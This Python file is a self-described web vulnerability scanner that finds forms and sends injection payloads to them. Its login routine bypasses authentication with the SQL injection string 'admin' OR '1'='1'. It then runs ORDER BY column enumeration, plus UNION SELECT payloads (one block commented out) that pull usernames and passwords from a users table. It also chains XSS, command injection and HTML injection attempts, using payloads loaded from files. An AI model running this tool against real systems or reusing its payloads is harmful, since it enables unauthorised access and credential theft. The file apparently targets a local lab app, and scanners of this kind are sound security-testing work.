import sys
import requests
from bs4 import BeautifulSoup
import platform
import os
import re


def create_session():
    session = requests.Session()
    print("Creating session")
    return session


def parse_input_fields(url, session):
    """
    Parses a webpage to extract input fields from forms.
    Prints the names of the input fields and their types for debugging.
    Returns a list of forms with their input fields.
    """
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        
        forms = []
        for form_index, form in enumerate(soup.find_all("form")):
            form_details = {
                "action": form.get("action") or "",  # Default to an empty string if 'action' is missing
                "method": form.get("method", "get").lower(),
                "inputs": []
            }
            print(f"\n[DEBUG] Form {form_index + 1}:")
            print(f"  Action: {form_details['action']}")
            print(f"  Method: {form_details['method'].upper()}")
            
            for input_tag in form.find_all("input"):
                input_name = input_tag.get("name")  # Might be None if 'name' is missing
                input_type = input_tag.get("type", "text")  # Default to 'text' if 'type' is missing
                
                if input_name:  # Only include input fields with a valid 'name'
                    print(f"    - Input Field: Name = {input_name}, Type = {input_type}")
                    form_details["inputs"].append({
                        "name": input_name,
                        "type": input_type
                    })
            
            forms.append(form_details)
        
        print(f"\n[DEBUG] Found {len(forms)} form(s) on the page.")
        return forms
    except Exception as e:
        print(f"[-] Error while parsing input fields: {e}")
        return []

def load_payloads(vulnerability_type, payload_dir="payload_texts"):
    """Loads payloads from external text files based on the vulnerability type."""
    
    # Get the absolute path to the payload directory
    script_dir = os.path.dirname(os.path.abspath(__file__))  # Directory where script is running
    payload_dir_path = os.path.join(script_dir, payload_dir)  # Full path to payload_texts
    payload_file = os.path.join(payload_dir_path, f"{vulnerability_type}.txt")

    print(f"[DEBUG] Looking for payload file: {payload_file}")  # Debugging statement

    if not os.path.isfile(payload_file):  # Ensure it's a valid file
        print(f"Warning: Payload file {payload_file} not found.")
        return []

    payloads = []
    try:
        with open(payload_file, "r", encoding="utf-8") as file:
            payloads = [line.strip() for line in file if line.strip()]  # Read non-empty lines
            print("PAYLOADS ----------------------------", payloads)
    except Exception as e:
        print(f"Error loading payload file {payload_file}: {e}")
        return []

    print(f"[DEBUG] Loaded {len(payloads)} payload(s) from {payload_file}")
    return payloads

def login_sql_injection(base_url, session):
    results=[]

    results.append(f" ")
    results.append(f"\n Login Using SQL Injection:")

    if session == None:
        session = create_session()
    forms = parse_input_fields(base_url, session)
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            #results.append(f"[DEBUG] Form {form_index + 1} has no action. Using base URL as form action.")
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Construct payload for SQL Injection
        payload = {
            input_field["name"]: "admin' OR '1'='1" if input_field["type"] == "text" else "password"
            for input_field in form["inputs"] if input_field["name"]
        }

        try:
            # Send the payload using the appropriate HTTP method
            if form["method"] == "post":
                response = session.post(form_action, data=payload)
            else:
                response = session.get(form_action, params=payload)

            if "Welcome" in response.text or "Dashboard" in response.text:
                results.append("[+] SQL Injection successful!")
            else:
                results.append("[-] SQL Injection failed.")
        except Exception as e:
            results.append(f"[-] Error while testing SQL Injection: {e}")
    return results


'''sql_payloads = [
                f"' UNION SELECT {', '.join(['sqlite_version()'] + ['NULL'] * (num_cols - 1))} --",
                "' ORDER BY 2 --",
                f"' UNION SELECT {', '.join(['username', 'password'] + ['NULL'] * (num_cols - 2))} FROM users --"
                f"' UNION SELECT {', '.join(['name'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE type='table' AND name LIKE '%user%' --",
                f"' UNION SELECT {', '.join(['name'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE type='table' --",
                f"' UNION SELECT {', '.join(['sql'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE name='users' --",
                "' OR X'61646d696e'='admin' --",
                "' OR 'a' || 'a' = 'aa' --"
            ]'''

def test_sql_injection(base_url, session):
    results = []
    results.append(" ")
    results.append("\nSQL Injection:")

    forms = parse_input_fields(base_url, session)

    for form in forms:
        form_action = base_url + form["action"]
        
        # Step 1: Determine the number of columns using ORDER BY
        num_cols = 0
        for i in range(1, 20):  # Increased range for better accuracy
            payload = {
                input_field["name"]: f"' ORDER BY {i} --" if input_field["type"] == "text" else "test"
                for input_field in form["inputs"] if input_field["name"]
            }
            try:
                if form["method"] == "post":
                    response = session.post(form_action, data=payload)
                else:
                    response = session.get(form_action, params=payload)
                
                if "error" in response.text.lower():
                    num_cols = i - 1  # The previous number is the correct column count
                    break
            except Exception as e:
                results.append(f"[-] Error while determining column count: {e}")
                return results

        results.append(f"[DEBUG] Number of columns detected: {num_cols}")

        if num_cols > 0:
            # Step 2: Load SQL Injection payloads
            raw_payloads = load_payloads("sql_injection")

            if not raw_payloads:
                results.append("[-] No SQL Injection payloads found. Check payload_texts/sql_injection.txt")
                return results

            sql_payloads = []
            for raw_payload in raw_payloads:
                formatted_payload = inject_column_placeholders(raw_payload, num_cols)
                sql_payloads.append(formatted_payload)


            print(f"[DEBUG] Reformatted SQL Payloads: {sql_payloads}")

            baseline_response = session.get(form_action).text  # Get baseline response for comparison
            baseline_length = len(baseline_response)  # Store length for comparison
            
            for sql_payload in sql_payloads:
                payload = {
                    input_field["name"]: sql_payload if input_field["type"] == "text" else "test"
                    for input_field in form["inputs"] if input_field["name"]
                }
                
                try:
                    if form["method"] == "post":
                        response = session.post(form_action, data=payload)
                    else:
                        response = session.get(form_action, params=payload)
                    
                    response_length = len(response.text)
                           
                    if "error" in response.text.lower() or response.status_code != 200:
                        results.append(f"[-] SQL Injection failed using: {sql_payload}")
                    else:
                        results.append(f"[+] SQL Injection successful using: {sql_payload}")
                        
                except Exception as e:
                    results.append(f"[-] Error while testing SQL Injection with {sql_payload}: {e}")
        
        else:
            results.append("[-] SQL Injection not detected. The database did not return errors or reveal column structure during testing.")

    return results

def test_xss(base_url, session):
    results = []

    # Load XSS payloads from the text file
    payloads = load_payloads("xss")
    
    if not payloads:
        results.append("[-] No XSS payloads found. Check the payload_texts/xss.txt file.")
        return results

    print(f"[DEBUG] Loaded {len(payloads)} XSS payloads.")

    forms = parse_input_fields(base_url, session)
    results.append(" ")
    results.append("Cross-Site Scripting (XSS):")

    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:
            form_action = base_url
        elif not form_action.startswith("http"):
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Test each XSS payload in the input fields
        for payload_value in payloads:  # Iterate through the list directly
            payload = {}

            for input_field in form["inputs"]:
                field_name = input_field["name"]
                field_type = input_field["type"]

                # Assign XSS payloads to text and textarea fields, otherwise use "test"
                if field_type in ["text", "textarea"]:
                    payload[field_name] = payload_value
                else:
                    payload[field_name] = "test"

            try:
                # Send the payload using the appropriate HTTP method
                if form["method"] == "post":
                    response = session.post(form_action, data=payload)
                else:
                    response = session.get(form_action, params=payload)

                # Check if the payload is executed in the response
                if payload_value in response.text:
                    results.append(f"[+] XSS vulnerability confirmed with Payload '{payload_value}' in Form {form_index + 1}!")
                else:
                    results.append(f"[-] XSS payload '{payload_value}' was not executed for Form {form_index + 1}.")
            
            except Exception as e:
                results.append(f"[-] Error while testing XSS for Form {form_index + 1} with Payload '{payload_value}': {e}")

    return results

def test_command_injection(base_url, session):
    results = []
    results.append(" ")
    results.append("\nCommand Injection:")

    # Determine the target OS and load the appropriate payload file
    if platform.system().lower() == "windows":
        payload_file = "command_injection_windows"
    else:
        payload_file = "command_injection_linux"

    # Load OS-specific command injection payloads
    raw_payloads = load_payloads(payload_file)

    if not raw_payloads:
        results.append(f"[-] No Command Injection payloads found. Check payload_texts/{payload_file}.txt")
        return results

    print(f"[DEBUG] Loaded {len(raw_payloads)} Command Injection payloads from {payload_file}.txt")

    # Parse payloads into a list of (command, success_indicator) tuples
    payloads = []
    for line in raw_payloads:
        parts = line.split(",", 1)  # Split into command and success indicator
        if len(parts) == 2:
            command, success_indicator = parts[0].strip(), parts[1].strip()
            payloads.append((command, success_indicator))
        else:
            print(f"[WARNING] Skipping invalid payload format: {line}")

    forms = parse_input_fields(base_url, session)

    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:
            form_action = base_url
        elif not form_action.startswith("http"):
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        for command, success_indicator in payloads:  # Iterate through parsed payloads
            payload = {
                input_field["name"]: command if input_field["type"] == "text" else "test"
                for input_field in form["inputs"] if input_field["name"]
            }

            try:
                # Send the payload using the appropriate HTTP method
                if form["method"] == "post":
                    response = session.post(form_action, data=payload)
                else:
                    response = session.get(form_action, params=payload)

                # Check if the specific success indicator appears in the response
                if success_indicator and success_indicator in response.text:
                    results.append(f"[+] Command Injection successful using: {command}")
                else:
                    results.append(f"[-] Command Injection failed using: {command}")
            except Exception as e:
                results.append(f"[-] Error while testing Command Injection with {command}: {e}")

    return results

def test_html_injection(base_url, session):
    results = []
    results.append(" ")
    results.append("HTML Injection:")
    print("[DEBUG] Loading HTML Injection payloads from file.")

    # Load HTML Injection payloads from the text file
    payloads = load_payloads("html_injection")

    if not payloads:
        results.append("[-] No HTML Injection payloads found. Check payload_texts/html_injection.txt file.")
        return results

    print(f"[DEBUG] Loaded {len(payloads)} HTML Injection payloads.")

    forms = parse_input_fields(base_url, session)

    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        for payload in payloads:
            injection_payload = {}

            for input_field in form["inputs"]:
                field_name = input_field["name"]
                field_type = input_field["type"]

                # Assign HTML injection payload to text and textarea fields; assign "test" to others
                if field_type in ["text", "textarea"]:
                    injection_payload[field_name] = payload
                else:
                    injection_payload[field_name] = "test"

            try:
                # Send the payload using the appropriate HTTP method
                if form["method"].lower() == "post":
                    response = session.post(form_action, data=injection_payload)
                else:
                    response = session.get(form_action, params=injection_payload)

                # Check if the payload appears in the response
                if payload in response.text:
                    results.append(f"[+] HTML Injection vulnerability confirmed in Form {form_index + 1} with payload: {payload}")
                else:
                    results.append(f"[-] Payload did not execute for Form {form_index + 1}: {payload}")
            except Exception as e:
                results.append(f"[-] Error while testing HTML Injection for Form {form_index + 1}: {e}")

    return results

def xss_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        results.extend(test_xss(target_url,session))
    return results

def command_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_command_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")

    return results

def html_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        print("Calling HTML Injection function")
        results.extend(test_html_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")
    return results

def sql_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_sql_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")
    return results

def complete_scan(target_url):
    results = []

    results.append(f"=== Vulnerability Scanner ===")
    # Create a session to handle cookies
    session = create_session()
    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    print(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f" [+] Login successful! Proceeding to the target page...")

        #Run SQL injection
        results.extend(test_sql_injection(target_url, session))
        # Run XSS Test
        results.extend(test_xss(target_url, session))
        # Run Command Injection Test
        results.extend(test_command_injection(target_url, session))
        # Run HTML Injection Test
        results.extend(test_html_injection(target_url, session))
        
    else:
        results.append(" [-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")


    return results

def inject_column_placeholders(payload, num_cols):
    """
    Replaces <<cols>> or <<cols:N>> with the exact number of NULLs needed to
    make the total number of columns in the SELECT statement equal to `num_cols`.
    This works regardless of where <<cols>> appears in the list.
    """
    if "<<" not in payload:
        return payload

    # Match <<cols>> or <<cols:N>>
    match = re.search(r"<<cols(?::(\d+))?>>", payload)
    if not match:
        return payload

    override = match.group(1)
    placeholder = match.group(0)

    # Case 1: <<cols:N>> — use fixed number of NULLs
    if override:
        null_count = int(override)
        nulls = ", ".join(["NULL"] * null_count)
        return payload.replace(placeholder, nulls)

    # Case 2: <<cols>> — auto calculate how many NULLs needed
    # Replace <<cols>> with temporary marker
    temp_payload = payload.replace(placeholder, "__COLS__")

    # Extract column list (between SELECT and -- or end of string)
    try:
        # Try to isolate column list
        after_select = re.split(r"(?i)\bselect\b", temp_payload, maxsplit=1)[1]
    except IndexError:
        # No SELECT keyword — fallback: use full payload
        after_select = temp_payload

    # Cut off at comment/end
    after_select = re.split(r"--|\n|\)|;", after_select)[0]

    # Count all values in the list (except the __COLS__)
    columns = [c.strip() for c in after_select.split(",")]
    known_values = [c for c in columns if "__COLS__" not in c and c]

    known_count = len(known_values)
    null_count = max(0, num_cols - known_count)

    # Replace with correct number of NULLs
    nulls = ", ".join(["NULL"] * null_count)
    return payload.replace(placeholder, nulls)
